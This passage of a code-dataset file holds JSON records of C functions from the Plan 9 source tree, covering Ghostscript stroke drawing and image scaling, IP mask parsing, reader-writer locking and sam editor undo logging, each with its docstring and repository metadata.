y)\n\t\t\t)\n\t\t\tsx = pseg->pt.x, sy = pseg->pt.y;\n\t\t}\n\t\t/*\n\t\t * Compute the properly oriented dot length, and then\n\t\t * draw the dot like a very short line.\n\t\t */\n\t\tudx = sx - x, udy = sy - y;\n\t\tif ((udx | udy) == 0) {\n\t\t    if (is_fzero(pgs_lp->dot_orientation.xy)) {\n\t\t\t/* Portrait orientation, dot length = X */\n\t\t\tudx = fixed_1;\n\t\t    } else {\n\t\t\t/* Landscape orientation, dot length = Y */\n\t\t\tudy = fixed_1;\n\t\t    }\n\t\t}\n\t\t{\n\t\t    double scale = device_dot_length /\n\t\t    hypot((double)udx, (double)udy);\n\n\t\t    /*\n\t\t     * If we're using butt caps, make sure the \"line\" is\n\t\t     * long enough to show up.\n\t\t     */\n\t\t    if (pgs_lp->cap == gs_cap_butt) {\n\t\t\tfixed dmax = max(any_abs(udx), any_abs(udy));\n\n\t\t\tif (dmax * scale < fixed_1)\n\t\t\t    scale = (float)fixed_1 / dmax;\n\t\t    }\n\t\t    udx = (fixed) (udx * scale);\n\t\t    udy = (fixed) (udy * scale);\n\t\t    if ((udx | udy) == 0)\n\t\t\tudy = fixed_epsilon;\n\t\t    sx = x + udx;\n\t\t    sy = y + udy;\n\t\t}\n\t\t/*\n\t\t * Back up 1 segment to keep the bookkeeping straight.\n\t\t */\n\t\tpseg = (pseg != 0 ? pseg->prev : psub->last);\n\t\tgoto d;\n\t    }\n\t    if (always_thin) {\n\t\tpl.e.cdelta.x = pl.e.cdelta.y = 0;\n\t\tpl.width.x = pl.width.y = 0;\n\t\tpl.thin = true;\n\t    } else {\n\t\tif (uniform != 0) {\n\t\t    /* We can save a lot of work in this case. */\n\t\t    /* We know orient != orient_other. */\n\t\t    double dpx = udx, dpy = udy;\n\t\t    double wl = device_line_width_scale /\n\t\t    hypot(dpx, dpy);\n\n\t\t    pl.e.cdelta.x = (fixed) (dpx * wl);\n\t\t    pl.e.cdelta.y = (fixed) (dpy * wl);\n\t\t    /* The width is the cap delta rotated by */\n\t\t    /* 90 degrees. */\n\t\t    if (initial_matrix_reflected)\n\t\t\tpl.width.x = pl.e.cdelta.y, pl.width.y = -pl.e.cdelta.x;\n\t\t    else\n\t\t\tpl.width.x = -pl.e.cdelta.y, pl.width.y = pl.e.cdelta.x;\n\t\t    pl.thin = false;\t/* if not always_thin, */\n\t\t    /* then never thin. */\n\n\t\t} else {\n\t\t    gs_point dpt;\t/* unscaled */\n\t\t    float wl;\n\n\t\t    gs_imager_idtransform(pis,\n\t\t\t\t\t  (float)udx, (float)udy, &dpt);\n\t\t    wl = line_width_and_scale /\n\t\t\thypot(dpt.x, dpt.y);\n\t\t    /* Construct the width vector in */\n\t\t    /* user space, still unscaled. */\n\t\t    dpt.x *= wl;\n\t\t    dpt.y *= wl;\n\t\t    /*\n\t\t     * We now compute both perpendicular\n\t\t     * and (optionally) parallel half-widths,\n\t\t     * as deltas in device space.  We use\n\t\t     * a fixed-point, unscaled version of\n\t\t     * gs_dtransform.  The second computation\n\t\t     * folds in a 90-degree rotation (in user\n\t\t     * space, before transforming) in the\n\t\t     * direction that corresponds to counter-\n\t\t     * clockwise in device space.\n\t\t     */\n\t\t    pl.e.cdelta.x = (fixed) (dpt.x * xx);\n\t\t    pl.e.cdelta.y = (fixed) (dpt.y * yy);\n\t\t    if (orient != orient_portrait)\n\t\t\tpl.e.cdelta.x += (fixed) (dpt.y * yx),\n\t\t\t    pl.e.cdelta.y += (fixed) (dpt.x * xy);\n\t\t    if (!reflected ^ initial_matrix_reflected)\n\t\t\tdpt.x = -dpt.x, dpt.y = -dpt.y;\n\t\t    pl.width.x = (fixed) (dpt.y * xx),\n\t\t\tpl.width.y = -(fixed) (dpt.x * yy);\n\t\t    if (orient != orient_portrait)\n\t\t\tpl.width.x -= (fixed) (dpt.x * yx),\n\t\t\t    pl.width.y += (fixed) (dpt.y * xy);\n\t\t    pl.thin = width_is_thin(&pl);\n\t\t}\n\t\tif (!pl.thin) {\n\t\t    adjust_stroke(&pl, pis, false);\n\t\t    compute_caps(&pl);\n\t\t}\n\t    }\n\t    if (index++) {\n\t\tgs_line_join join =\n\t\t    (pseg->notes & not_first ? curve_join : pgs_lp->join);\n\t\tint first;\n\t\tpl_ptr lptr;\n\n\t\tif (join == gs_join_none) {\n\t\t    /* Fake the end of a subpath so we get */\n\t\t    /* caps instead of joins. */\n\t\t    first = 0;\n\t\t    lptr = 0;\n\t\t    index = 1;\n\t\t} else {\n\t\t    first = (is_closed ? 1 : index - 2);\n\t\t    lptr = &pl;\n\t\t}\n\t\tcode = (*line_proc) (to_path, first, &pl_prev, lptr,\n\t\t\t\t     pdevc, dev, pis, params, &cbox,\n\t\t\t\t     uniform, join, initial_matrix_reflected);\n\t\tif (code < 0)\n\t\t    goto exit;\n\t\tFILL_STROKE_PATH(always_thin);\n\t    } else\n\t\tpl_first = pl;\n\t    pl_prev = pl;\n\t    x = sx, y = sy;\n\t}\n\tif (index) {\n\t    /* If closed, join back to start, else cap. */\n\t    gs_line_join join =\n\t\t((pseg == 0 ? (const segment *)spath->first_subpath :\n\t\t  pseg)->notes & not_first ? curve_join : pgs_lp->join);\n\t    /* For some reason, the Borland compiler requires the cast */\n\t    /* in the following statement. */\n\t    pl_ptr lptr =\n\t\t(!is_closed || join == gs_join_none ?\n\t\t (pl_ptr) 0 : (pl_ptr) & pl_first);\n\n\t    code = (*line_proc) (to_path, index - 1, &pl_prev, lptr, pdevc,\n\t\t\t\t dev, pis, params, &cbox, uniform, join, \n\t\t\t\t initial_matrix_reflected);\n\t    if (code < 0)\n\t\tgoto exit;\n\t    FILL_STROKE_PATH(always_thin);\n\t}\n\tpsub = (const subpath *)pseg;\n    }\n  exit:\n    if (to_path == &stroke_path_body)\n\tgx_path_free(&stroke_path_body, \"gx_stroke_path_only error\");\t/* (only needed if error) */\n    if (dash_count)\n\tgx_path_free(&dpath, \"gx_stroke_path exit(dash path)\");\n  exf:\n    if (ppath->curve_count)\n\tgx_path_free(&fpath, \"gx_stroke_path exit(flattened path)\");\n    return code;\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* same as rlock but punts if there are any writers waiting */\n", "func_signal": "int\ncanrlock(RWlock *q)", "code": "{\n\tlock(&q->use);\n\trwstats.rlock++;\n\tif(q->writer == 0 && q->head == nil){\n\t\t/* no writer, go for it */\n\t\tq->readers++;\n\t\tunlock(&q->use);\n\t\treturn 1;\n\t}\n\tunlock(&q->use);\n\treturn 0;\n}", "path": "plan9/sys/src/9/port/qlock.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Draw a line on the device. */\n/* Treat no join the same as a bevel join. */\n", "func_signal": "private int\nstroke_fill(gx_path * ppath, int first, register pl_ptr plp, pl_ptr nplp,\n\t    const gx_device_color * pdevc, gx_device * dev,\n\t    const gs_imager_state * pis, const gx_stroke_params * params,\n\t    const gs_fixed_rect * pbbox, int uniform, gs_line_join join,\n\t    bool reflected)", "code": "{\n    const fixed lix = plp->o.p.x;\n    const fixed liy = plp->o.p.y;\n    const fixed litox = plp->e.p.x;\n    const fixed litoy = plp->e.p.y;\n\n    if (plp->thin) {\n\t/* Minimum-width line, don't have to be careful with caps/joins. */\n\treturn (*dev_proc(dev, draw_thin_line))(dev, lix, liy, litox, litoy,\n\t\t\t\t\t\tpdevc, pis->log_op);\n    }\n    /* Check for being able to fill directly. */\n    {\n\tconst gx_line_params *pgs_lp = gs_currentlineparams_inline(pis);\n\tgs_line_cap cap = pgs_lp->cap;\n\n\tif (!plp->thin && (nplp == 0 || !nplp->thin)\n\t    && ((first != 0 && nplp != 0) || cap == gs_cap_butt\n\t\t|| cap == gs_cap_square)\n\t    && (join == gs_join_bevel || join == gs_join_miter ||\n\t\tjoin == gs_join_none)\n\t    && (pis->fill_adjust.x | pis->fill_adjust.y) == 0\n\t    && lop_is_idempotent(pis->log_op)\n\t    ) {\n\t    gs_fixed_point points[6];\n\t    int npoints, code;\n\t    fixed ax, ay, bx, by;\n\n\t    npoints = cap_points((first == 0 ? cap : gs_cap_butt),\n\t\t\t\t &plp->o, points);\n\t    if (nplp == 0)\n\t\tcode = cap_points(cap, &plp->e, points + npoints);\n\t    else\n\t\tcode = line_join_points(pgs_lp, plp, nplp, points + npoints,\n\t\t\t\t\t(uniform ? (gs_matrix *) 0 :\n\t\t\t\t\t &ctm_only(pis)), join, reflected);\n\t    if (code < 0)\n\t\tgoto general;\n\t    /* Make sure the parallelogram fill won't overflow. */\n#define SUB_OVERFLOWS(r, u, v)\\\n  (((r = u - v) ^ u) < 0 && (u ^ v) < 0)\n\t    if (SUB_OVERFLOWS(ax, points[0].x, points[1].x) ||\n\t\tSUB_OVERFLOWS(ay, points[0].y, points[1].y) ||\n\t\tSUB_OVERFLOWS(bx, points[2].x, points[1].x) ||\n\t\tSUB_OVERFLOWS(by, points[2].y, points[1].y)\n\t\t)\n\t\tgoto general;\n#undef SUB_OVERFLOWS\n\t    if (nplp != 0) {\n\t\tif (join == gs_join_miter) {\n\t\t    /* Make sure we have a bevel and not a miter. */\n\t\t    if (!(points[2].x == plp->e.co.x &&\n\t\t\t  points[2].y == plp->e.co.y &&\n\t\t\t  points[5].x == plp->e.ce.x &&\n\t\t\t  points[5].y == plp->e.ce.y)\n\t\t\t)\n\t\t\tgoto fill;\n\t\t} {\n\t\t    const gs_fixed_point *bevel = points + 2;\n\n\t\t    /* Identify which 3 points define the bevel triangle. */\n\t\t    if (points[3].x == nplp->o.p.x &&\n\t\t\tpoints[3].y == nplp->o.p.y\n\t\t\t)\n\t\t\t++bevel;\n\t\t    /* Fill the bevel. */\n\t\t    code = (*dev_proc(dev, fill_triangle)) (dev,\n\t\t\t\t\t\t\t bevel->x, bevel->y,\n\t\t\t       bevel[1].x - bevel->x, bevel[1].y - bevel->y,\n\t\t\t       bevel[2].x - bevel->x, bevel[2].y - bevel->y,\n\t\t\t\t\t\t\tpdevc, pis->log_op);\n\t\t    if (code < 0)\n\t\t\treturn code;\n\t\t}\n\t    }\n\t    /* Fill the body of the stroke. */\n\t    return (*dev_proc(dev, fill_parallelogram)) (dev,\n\t\t\t\t\t\t   points[1].x, points[1].y,\n\t\t\t\t\t\t\t ax, ay, bx, by,\n\t\t\t\t\t\t\t pdevc, pis->log_op);\n\t  fill:\n\t    code = add_points(ppath, points, npoints + code, true);\n\t    if (code < 0)\n\t\treturn code;\n\t    return gx_path_close_subpath(ppath);\n\t}\n    }\n    /* General case: construct a path for the fill algorithm. */\n general:\n    return stroke_add(ppath, first, plp, nplp, pdevc, dev, pis, params,\n\t\t      pbbox, uniform, join, reflected);\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Release the filter's storage. */\n", "func_signal": "private void\ns_IScale_release(stream_state * st)", "code": "{\n    stream_IScale_state *const ss = (stream_IScale_state *) st;\n    gs_memory_t *mem = ss->memory;\n\n    gs_free_object(mem, (void *)ss->src, \"image_scale src\");\t/* no longer const */\n    ss->src = 0;\n    gs_free_object(mem, ss->dst, \"image_scale dst\");\n    ss->dst = 0;\n    gs_free_object(mem, ss->items, \"image_scale contrib[*]\");\n    ss->items = 0;\n    gs_free_object(mem, ss->contrib, \"image_scale contrib\");\n    ss->contrib = 0;\n    gs_free_object(mem, ss->tmp, \"image_scale tmp\");\n    ss->tmp = 0;\n}", "path": "plan9/sys/src/cmd/gs/src/siscale.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Add a segment to the path.  This handles all the complex cases. */\n", "func_signal": "private int\nstroke_add(gx_path * ppath, int first, pl_ptr plp, pl_ptr nplp,\n\t   const gx_device_color * pdevc, gx_device * dev,\n\t   const gs_imager_state * pis, const gx_stroke_params * params,\n\t   const gs_fixed_rect * ignore_pbbox, int uniform, gs_line_join join,\n\t   bool reflected)", "code": "{\n    const gx_line_params *pgs_lp = gs_currentlineparams_inline(pis);\n    gs_fixed_point points[8];\n    int npoints;\n    int code;\n    bool moveto_first = true;\n\n    if (plp->thin) {\n\t/* We didn't set up the endpoint parameters before, */\n\t/* because the line was thin.  Do it now. */\n\tset_thin_widths(plp);\n\tadjust_stroke(plp, pis, true);\n\tcompute_caps(plp);\n    }\n    /* Create an initial cap if desired. */\n    if (first == 0 && pgs_lp->cap == gs_cap_round) {\n\tvd_moveto(plp->o.co.x, plp->o.co.y);\n\tif ((code = gx_path_add_point(ppath, plp->o.co.x, plp->o.co.y)) < 0 ||\n\t    (code = add_round_cap(ppath, &plp->o)) < 0\n\t    )\n\t    return code;\n\tnpoints = 0;\n\tmoveto_first = false;\n    } else {\n\tif ((npoints = cap_points((first == 0 ? pgs_lp->cap : gs_cap_butt), &plp->o, points)) < 0)\n\t    return npoints;\n    }\n    if (nplp == 0) {\n\t/* Add a final cap. */\n\tif (pgs_lp->cap == gs_cap_round) {\n\t    ASSIGN_POINT(&points[npoints], plp->e.co);\n\t    vd_lineto(points[npoints].x, points[npoints].y);\n\t    ++npoints;\n\t    if ((code = add_points(ppath, points, npoints, moveto_first)) < 0)\n\t\treturn code;\n\t    code = add_round_cap(ppath, &plp->e);\n\t    goto done;\n\t}\n\tcode = cap_points(pgs_lp->cap, &plp->e, points + npoints);\n    } else if (join == gs_join_round) {\n\tASSIGN_POINT(&points[npoints], plp->e.co);\n\tvd_lineto(points[npoints].x, points[npoints].y);\n\t++npoints;\n\tif ((code = add_points(ppath, points, npoints, moveto_first)) < 0)\n\t    return code;\n\tcode = add_round_cap(ppath, &plp->e);\n\tgoto done;\n    } else if (nplp->thin)\t/* no join */\n\tcode = cap_points(gs_cap_butt, &plp->e, points + npoints);\n    else\t\t\t/* non-round join */\n\tcode = line_join_points(pgs_lp, plp, nplp, points + npoints,\n\t\t\t\t(uniform ? (gs_matrix *) 0 : &ctm_only(pis)),\n\t\t\t\tjoin, reflected);\n    if (code < 0)\n\treturn code;\n    code = add_points(ppath, points, npoints + code, moveto_first);\n  done:\n    if (code < 0)\n\treturn code;\n    vd_closepath;\n    return gx_path_close_subpath(ppath);\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n *  hack to allow ip v4 masks to be entered in the old\n *  style\n */\n", "func_signal": "vlong\nparseipmask(uchar *to, char *from)", "code": "{\n\tint i, w;\n\tvlong x;\n\tuchar *p;\n\n\tif(*from == '/'){\n\t\t/* as a number of prefix bits */\n\t\ti = atoi(from+1);\n\t\tif(i < 0)\n\t\t\ti = 0;\n\t\tif(i > 128)\n\t\t\ti = 128;\n\t\tw = i;\n\t\tmemset(to, 0, IPaddrlen);\n\t\tfor(p = to; i >= 8; i -= 8)\n\t\t\t*p++ = 0xff;\n\t\tif(i > 0)\n\t\t\t*p = ~((1<<(8-i))-1);\n\t\tx = nhgetl(to+IPv4off);\n\t\t/*\n\t\t * identify as ipv6 if the mask is inexpressible as a v4 mask\n\t\t * (because it has too few mask bits).  Arguably, we could\n\t\t * always return 6 here.\n\t\t */\n\t\tif (w < 8*(IPaddrlen-IPv4addrlen))\n\t\t\treturn 6;\n\t} else {\n\t\t/* as a straight v4 bit mask */\n\t\tx = parseip(to, from);\n\t\tif (x != -1)\n\t\t\tx = (ulong)nhgetl(to + IPv4off);\n\t\tif(memcmp(to, v4prefix, IPv4off) == 0)\n\t\t\tmemset(to, 0xff, IPv4off);\n\t}\n\treturn x;\n}", "path": "plan9/nix/sys/src/libip/parseip.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Calculate the weights for an output row. */\n", "func_signal": "private void\ncalculate_dst_contrib(stream_IScale_state * ss, int y)", "code": "{\n    uint row_size = ss->params.WidthOut * ss->params.Colors;\n    int last_index =\n    calculate_contrib(&ss->dst_next_list, ss->dst_items, ss->yscale,\n\t\t      y, 1, ss->params.HeightIn, MAX_ISCALE_SUPPORT, row_size,\n\t\t      (double)ss->params.MaxValueOut / (fixedScaleFactor * unitPixelTmp) );\n    int first_index_mod = ss->dst_next_list.first_pixel / row_size;\n\n    ss->dst_last_index = last_index;\n    last_index %= MAX_ISCALE_SUPPORT;\n    if (last_index < first_index_mod) {\t\t/* Shuffle the indices to account for wraparound. */\n\tCONTRIB shuffle[MAX_ISCALE_SUPPORT];\n\tint i;\n\n\tfor (i = 0; i < MAX_ISCALE_SUPPORT; ++i)\n\t    shuffle[i].weight =\n\t\t(i <= last_index ?\n\t\t ss->dst_items[i + MAX_ISCALE_SUPPORT - first_index_mod].weight :\n\t\t i >= first_index_mod ?\n\t\t ss->dst_items[i - first_index_mod].weight :\n\t\t 0);\n\tmemcpy(ss->dst_items, shuffle, MAX_ISCALE_SUPPORT * sizeof(CONTRIB));\n\tss->dst_next_list.n = MAX_ISCALE_SUPPORT;\n\tss->dst_next_list.first_pixel = 0;\n    }\n#ifdef DEBUG\n    if (gs_debug_c('w')) {\n\tdprintf1(\"[w]calc dest contrib for y = %d\\n\", y);\n    }\n#endif\n}", "path": "plan9/sys/src/cmd/gs/src/siscale.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n * like fileunsetname, but get the data from arguments\n */\n", "func_signal": "void\nlogsetname(File *f, String *s)", "code": "{\n\tUndo u;\n\tBuffer *delta;\n\n\tif(f->rescuing)\n\t\treturn;\n\n\tif(f->unread){\t/* This is setting initial file name */\n\t\tfilesetname(f, s);\n\t\treturn;\n\t}\n\n\tif(f->seq < seq)\n\t\tfilemark(f);\n\n\t/* undo a file name change by restoring old name */\n\tdelta = &f->epsilon;\n\tu.type = Filename;\n\tu.mod = TRUE;\n\tu.seq = f->seq;\n\tu.p0 = 0;\t/* unused */\n\tu.n = s->n;\n\tif(s->n)\n\t\tbufinsert(delta, delta->nc, s->s, s->n);\n\tbufinsert(delta, delta->nc, (Rune*)&u, Undosize);\n\tif(!f->unread && !f->mod)\n\t\tstate(f, Dirty);\n}", "path": "plan9/sys/src/cmd/sam/file.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Set up the width and delta parameters for a thin line. */\n/* We only approximate the width and height. */\n", "func_signal": "private void\nset_thin_widths(register pl_ptr plp)", "code": "{\n    fixed dx = plp->e.p.x - plp->o.p.x, dy = plp->e.p.y - plp->o.p.y;\n\n#define TRSIGN(v, c) ((v) >= 0 ? (c) : -(c))\n    if (any_abs(dx) > any_abs(dy)) {\n\tplp->width.x = plp->e.cdelta.y = 0;\n\tplp->width.y = plp->e.cdelta.x = TRSIGN(dx, fixed_half);\n    } else {\n\tplp->width.y = plp->e.cdelta.x = 0;\n\tplp->width.x = -(plp->e.cdelta.y = TRSIGN(dy, fixed_half));\n    }\n#undef TRSIGN\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/*\n *  parse a v4 ip address/mask in cidr format\n */\n", "func_signal": "char*\nv4parsecidr(uchar *addr, uchar *mask, char *from)", "code": "{\n\tint i;\n\tchar *p;\n\tuchar *a;\n\n\tp = v4parseip(addr, from);\n\n\tif(*p == '/'){\n\t\t/* as a number of prefix bits */\n\t\ti = strtoul(p+1, &p, 0);\n\t\tif(i > 32)\n\t\t\ti = 32;\n\t\tmemset(mask, 0, IPv4addrlen);\n\t\tfor(a = mask; i >= 8; i -= 8)\n\t\t\t*a++ = 0xff;\n\t\tif(i > 0)\n\t\t\t*a = ~((1<<(8-i))-1);\n\t} else \n\t\tmemcpy(mask, defmask(addr), IPv4addrlen);\n\treturn p;\n}", "path": "plan9/nix/sys/src/libip/parseip.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Compute the endpoints of the two caps of a segment. */\n/* Only o.p, e.p, width, and cdelta have been set. */\n", "func_signal": "private void\ncompute_caps(pl_ptr plp)", "code": "{\n    fixed wx2 = plp->width.x;\n    fixed wy2 = plp->width.y;\n\n    plp->o.co.x = plp->o.p.x + wx2, plp->o.co.y = plp->o.p.y + wy2;\n    plp->o.cdelta.x = -plp->e.cdelta.x,\n\tplp->o.cdelta.y = -plp->e.cdelta.y;\n    plp->o.ce.x = plp->o.p.x - wx2, plp->o.ce.y = plp->o.p.y - wy2;\n    plp->e.co.x = plp->e.p.x - wx2, plp->e.co.y = plp->e.p.y - wy2;\n    plp->e.ce.x = plp->e.p.x + wx2, plp->e.ce.y = plp->e.p.y + wy2;\n#ifdef DEBUG\n    if (gs_debug_c('O')) {\n\tdlprintf4(\"[o]Stroke o=(%f,%f) e=(%f,%f)\\n\",\n\t\t  fixed2float(plp->o.p.x), fixed2float(plp->o.p.y),\n\t\t  fixed2float(plp->e.p.x), fixed2float(plp->e.p.y));\n\tdlprintf4(\"\\twxy=(%f,%f) lxy=(%f,%f)\\n\",\n\t\t  fixed2float(wx2), fixed2float(wy2),\n\t\t  fixed2float(plp->e.cdelta.x),\n\t\t  fixed2float(plp->e.cdelta.y));\n    }\n#endif\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Define the default implementation of the device stroke_path procedure. */\n", "func_signal": "int\ngx_default_stroke_path(gx_device * dev, const gs_imager_state * pis,\n\t\t       gx_path * ppath, const gx_stroke_params * params,\n\t\t       const gx_drawing_color * pdcolor,\n\t\t       const gx_clip_path * pcpath)", "code": "{\n    return gx_stroke_path_only(ppath, (gx_path *) 0, dev, pis, params,\n\t\t\t       pdcolor, pcpath);\n}", "path": "plan9/sys/src/cmd/gs/src/gxstroke.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Initialize the filter. */\n", "func_signal": "private int\ns_IScale_init(stream_state * st)", "code": "{\n    stream_IScale_state *const ss = (stream_IScale_state *) st;\n    gs_memory_t *mem = ss->memory;\n\n    ss->sizeofPixelIn = ss->params.BitsPerComponentIn / 8;\n    ss->sizeofPixelOut = ss->params.BitsPerComponentOut / 8;\n    ss->xscale = (double)ss->params.WidthOut / (double)ss->params.WidthIn;\n    ss->yscale = (double)ss->params.HeightOut / (double)ss->params.HeightIn;\n\n    ss->src_y = 0;\n    ss->src_size = ss->params.WidthIn * ss->sizeofPixelIn * ss->params.Colors;\n    ss->src_offset = 0;\n    ss->dst_y = 0;\n    ss->dst_size = ss->params.WidthOut * ss->sizeofPixelOut * ss->params.Colors;\n    ss->dst_offset = 0;\n\n    /* create intermediate image to hold horizontal zoom */\n    ss->tmp = (PixelTmp *) gs_alloc_byte_array(mem,\n\t\t\t\t\t   min(ss->tmp_height, MAX_ISCALE_SUPPORT),\n\t\t\t      ss->tmp_width * ss->params.Colors * sizeof(PixelTmp),\n\t\t\t\t\t       \"image_scale tmp\");\n    ss->contrib = (CLIST *) gs_alloc_byte_array(mem,\n\t\t\t\t\t   max(ss->params.WidthOut, ss->params.HeightOut),\n\t\t\t\t      sizeof(CLIST), \"image_scale contrib\");\n    ss->items = (CONTRIB *) gs_alloc_byte_array(mem,\n\t\t\t\t  contrib_pixels(ss->xscale) * ss->params.WidthOut,\n\t\t\t\t sizeof(CONTRIB), \"image_scale contrib[*]\");\n    /* Allocate buffers for 1 row of source and destination. */\n    ss->dst = gs_alloc_byte_array(mem, ss->params.WidthOut * ss->params.Colors,\n\t\t\t\t  ss->sizeofPixelOut, \"image_scale dst\");\n    ss->src = gs_alloc_byte_array(mem, ss->params.WidthIn * ss->params.Colors,\n\t\t\t\t  ss->sizeofPixelIn, \"image_scale src\");\n    if (ss->tmp == 0 || ss->contrib == 0 || ss->items == 0 ||\n\tss->dst == 0 || ss->src == 0\n\t) {\n\ts_IScale_release(st);\n\treturn ERRC;\n/****** WRONG ******/\n    }\n    /* Pre-calculate filter contributions for a row. */\n    calculate_contrib(ss->contrib, ss->items, ss->xscale,\n\t\t      0, ss->params.WidthOut, ss->params.WidthIn, ss->params.WidthIn,\n\t\t      ss->params.Colors, (double)unitPixelTmp * fixedScaleFactor / ss->params.MaxValueIn);\n\n    /* Prepare the weights for the first output row. */\n    calculate_dst_contrib(ss, 0);\n\n    return 0;\n\n}", "path": "plan9/sys/src/cmd/gs/src/siscale.c", "commit_date": "2014-02-09 00:00:00", "repo_name": "brho/plan9", "stars": 667, "license": "other", "language": "c", "size": 52242}
{"docstring": "/* Compute the points for a bevel, miter, or triangle join. */\n/* Treat no join the same as a bevel join. */\n/* If pmat != 0, we must inverse-transform the distances for */\n/* the miter check. */\n", "func_signal": "private int\nline_join_points(const gx_line_params * pgs_lp, pl_ptr plp, pl_ptr nplp,\n\t\t gs_fixed_point * join_points, const gs_matrix * pmat,\n\t\t gs_line_join join, bool reflected)", "code": "{\n#define jp1 join_points[0]\n#define np1 join_points[1]\n#define np2 join_points[2]\n#define jp2 join_points[3]\n#define jpx join_points[4]\n    /*\n     * Set np to whichever of nplp->o.co or .ce is outside\n     * the current line.  We observe that the point (x2,y2)\n     * is counter-clockwise from (x1,y1), relative to the origin,\n     * iff\n     *  (arctan(y2/x2) - arctan(y1/x1)) mod 2*pi < pi,\n     * taking the signs of xi and yi into account to determine\n     * the quadrants of the results.  It turns out that\n     * even though arctan is monotonic only in the 4th/1st\n     * quadrants and the 2nd/3rd quadrants, case analysis on\n     * the signs of xi and yi demonstrates that this test\n     * is equivalent to the much less expensive test\n     *  x1 * y2 > x2 * y1\n     * in all cases.\n     *\n     * In the present instance, x1,y1 are plp->width,\n     * x2,y2 are nplp->width, and the origin is\n     * their common point (plp->e.p, nplp->o.p).\n     * ccw will be true iff nplp.o.co (nplp.o.p + width) is\n     * counter-clockwise from plp.e.ce (plp.e.p + width),\n     * in which case we want tan(a-b) rather than tan(b-a).\n     *\n     * We make the test using double arithmetic only because\n     * the !@#&^*% C language doesn't give us access to\n     * the double-width-result multiplication operation\n     * that almost all CPUs provide!\n     */\n    bool ccw =\n\t(double)(plp->width.x) /* x1 */ * (nplp->width.y) /* y2 */ >\n\t(double)(nplp->width.x) /* x2 */ * (plp->width.y) /* y1 */;\n    bool ccw0 = ccw;\n    p_ptr outp, np;\n\n    ccw ^= reflected;\n\n    /* Initialize for a bevel join. */\n    ASSIGN_POINT(&jp1, plp->e.co);\n    ASSIGN_POINT(&jp2, plp->e.ce);\n\n    /*\n     * Because of stroke adjustment, it is possible that\n     * plp->e.p != nplp->o.p.  For that reason, we must use\n     * nplp->o.p as np1 or np2.\n     */\n    if (!ccw) {\n\toutp = &jp2;\n\tASSIGN_POINT(&np2, nplp->o.co);\n\tASSIGN_POINT(&np1, nplp->o.p);\n\tnp = &np2;\n    } else {\n\toutp = &jp1;\n\tASSIGN_POINT(&np1, nplp->o.ce);\n\tASSIGN_POINT(&np2, nplp->o.p);\n\tnp = &np1;\n    }\n    if_debug1('O', \"[o]use %s\\n\", (ccw ? \"co (ccw)\" : \"ce (cw)\"));\n\n    /* Handle triangular joins now. */\n    if (join == gs_join_triangle) {\n\tfixed tpx = outp->x - nplp->o.p.x + np->x;\n\tfixed tpy = outp->y - nplp->o.p.y + np->y;\n\n\tASSIGN_POINT(&jpx, jp2);\n\tif (!ccw) {\n\t    /* Insert tp between np2 and jp2. */\n\t    jp2.x = tpx, jp2.y = tpy;\n\t} else {\n\t    /* Insert tp between jp1 and np1. */\n\t    ASSIGN_POINT(&jp2, np2);\n\t    ASSIGN_POINT(&np2, np1);\n\t    np1.x = tpx, np1.y = tpy;\n\t}\n\treturn 5;\n    }\n    /*\n     * Don't bother with the miter check if the two\n     * points to be joined are very close together,\n     * namely, in the same square half-pixel.\n     */\n    if (join == gs_join_miter &&\n\t!(fixed2long(outp->x << 1) == fixed2long(np->x << 1) &&\n\t  fixed2long(outp->y << 1) == fixed2long(np->y << 1))\n\t) {\n\t/*\n\t * Check whether a miter join is appropriate.\n\t * Let a, b be the angles of the two lines.\n\t * We check tan(a-b) against the miter_check\n\t * by using the following formula:\n\t *      If tan(a)=u1/v1 and tan(b)=u2/v2, then\n\t *      tan(a-b) = (u1*v2 - u2*v1) / (u1*u2 + v1*v2).\n\t *\n\t * We can do all the computations unscaled,\n\t * because we're only concerned with ratios.\n\t * However, if we have a non-uniform coordinate\n\t * system (indicated by pmat != 0), we must do the\n\t * computations in user space.\n\t */\n\tfloat check = pgs_lp->miter_check;\n\tdouble u1 = plp->e.cdelta.y, v1 = plp->e.cdelta.x;\n\tdouble u2 = nplp->o.cdelta.y, v2 = nplp->o.cdelta.x;\n\tdouble num, denom;\n\tint code;\n\n\tif (pmat) {\n\t    gs_point pt;\n\n\t    code = gs_distance_transform_inverse(v1, u1, pmat, &pt);\n\t    if (code < 0)\n\t\treturn code;\n\t    v1 = pt.x, u1 = pt.y;\n\t    code = gs_distance_transform_inverse(v2, u2, pmat, &pt);\n\t    if (code < 0)\n\t\treturn code;\n\t    v2 = pt.x, u2 = pt.y;\n\t    /*\n\t     * We need to recompute ccw according to 